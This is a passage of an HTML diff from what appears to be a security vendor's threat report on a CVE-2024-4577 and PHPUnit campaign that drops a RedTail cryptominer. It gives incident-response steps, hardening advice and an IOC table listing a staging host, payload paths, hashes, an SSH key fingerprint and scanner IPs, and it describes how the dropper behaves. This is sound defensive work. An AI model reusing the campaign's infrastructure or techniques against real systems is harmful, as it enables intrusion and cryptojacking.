+<li><strong>Did it get past the web layer?</strong> If only W1 to W3 fired, check the target is patched and not running php-cgi, then close it. If any E rule fired on the same host, treat it as a compromise.</li>
+<li><strong>Contain.</strong> <span class="org orgA">Org A</span> Network-contain the host from the Falcon console. Containment leaves the sensor connected, so Real Time Response still works. <span class="org orgB">Org B</span> Use <em>Isolate device</em> in Defender, which is supported on Linux, and collect an investigation package.</li>
+<li><strong>Scope the process tree.</strong> Start from the web server process and pull every descendant. You're looking for the dropper's working directory (whichever one passed the <code>dd</code> test) and a dot-file of about 2 MB in it. <span class="org orgA">Org A</span> Use the process explorer, or RTR <code>ls -la</code> on the candidate directories. <span class="org orgB">Org B</span> Pivot from the alert to the device timeline and filter by <code>www-data</code>.</li>
+<li><strong>Look for the SSH key.</strong> If <code>scp</code> ran, the key and config were deleted afterwards, but the outbound port-22 connection will still be in <code>NetworkConnectIP4</code> or <code>DeviceNetworkEvents</code>.</li>
+<li><strong>Find the way in.</strong> Use the W2 or W3 hit to work out which exploit landed. The campaign tag in the command line (<code>cve_2024_4577</code>) tells you directly. Patch that, not just the symptom.</li>
+<li><strong>Rebuild, don't clean.</strong> It's a web server with an attacker's shell on it. Redeploy from a known image and rotate any secrets the web user could read.</li>
+</ol>
+
+<h2 id="harden">7. Hardening</h2>
+<ul>
+<li>Don't run PHP as CGI on Windows. If you have to, run PHP 8.3.8, 8.2.20, 8.1.29 or later.</li>
+<li>Never deploy <code>vendor/</code> with dev dependencies to a web root. Run <code>composer install --no-dev</code>, and deny <code>/vendor/</code> at the web server.</li>
+<li>Block outbound TCP 22 from web servers, and alert on the denies. The first-stage payload depends on it.</li>
+<li>Mount <code>/tmp</code>, <code>/var/tmp</code> and <code>/dev/shm</code> noexec, and make sure the web user owns no other executable-capable directory. The dropper goes looking for exactly that.</li>
+<li>Default-deny outbound from the web tier, with an explicit allowlist. That defeats both the <code>scp</code> and the HTTPS fallback.</li>
+</ul>
+
+<h2 id="iocs">8. IOCs</h2>
+<p>These are at the bottom of the pyramid. Load them, then go back and build the behavioural rules.</p>
+<table><thead><tr><th>Type</th><th>Value</th></tr></thead><tbody>
+<tr><td>Staging host</td><td><code>217.60.102[.]5</code>: HTTPS for <code>/sh</code>, <code>/clean</code>, <code>/x86_64</code>, <code>/i686</code>, <code>/aarch64</code>, <code>/arm7</code>, <code>/riscv</code>; SSH 22 as user <code>dlr</code></td></tr>
+<tr><td>User-Agent</td><td><code>libredtail-http</code></td></tr>
+<tr><td>Dropper SHA-256</td><td><code>917fcc9131c6e9ca16264a85afc62532297bb39eb9d37765dad536c7c8c7735c</code></td></tr>
+<tr><td>Miner (x86_64, UPX) SHA-256</td><td><code>f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987</code></td></tr>
+<tr><td>Embedded SSH key</td><td><code>SHA256:O/at8341SoPpKvTPvMsJSgjQm30md9VTS2it25sY0vg</code> (comment <code>dlr@sftp</code>)</td></tr>
+<tr><td>Files</td><td><code>key.ppk</code>, <code>sshcfg</code>, <code>out_sh</code>, <code>.redtail</code>, <code>.testfile2</code>, a random 2 MB dot-file</td></tr>
+<tr><td>Canary</td><td>MD5 of <code>Hello CVE-2024-4577</code>, <code>Hello PHPUnit</code>, <code>Hello</code> or <code>hi</code> in a response body</td></tr>
+<tr><td>Scanner IPs</td><td><code>169.58.137.184</code>, <code>45.140.193.140</code>, <code>165.99.207.153</code>, <code>102.244.97.185</code>, <code>119.15.169.38</code>, <code>184.185.26.51</code>, <code>101.35.95.146</code>, <code>157.245.84.42</code>, <code>58.182.58.128</code>, <code>209.99.187.10</code>, <code>51.159.5.6</code>, <code>171.34.139.222</code></td></tr>
+</tbody></table>
+<aside aria-label="Work with Global SOC" style="margin:40px 0 20px;padding:24px;border:1px solid #c8dce7;border-radius:12px;background:#e6f0f5;color:#142333"><h2 style="margin:0 0 12px">Have a project or security question?</h2><p>Talk to our Glen Waverley, Melbourne team about secure apps, DNS or email security.</p><a href="/#contact">Discuss your project with Global SOC &rarr;</a></aside></main>
+<footer>
+  <div style="max-width:1000px;margin:auto;padding:20px 24px;border-top:1px solid #d6e1e9;font-size:14px;color:#47687c;">
+    © 2026 Global SOC Pty Ltd · <a href="/privacy.html">Privacy Policy</a>
+  </div>
+</footer>
+<script src="https://globalsoc.com.au/v.js" defer></script>
+</body>
+</html>
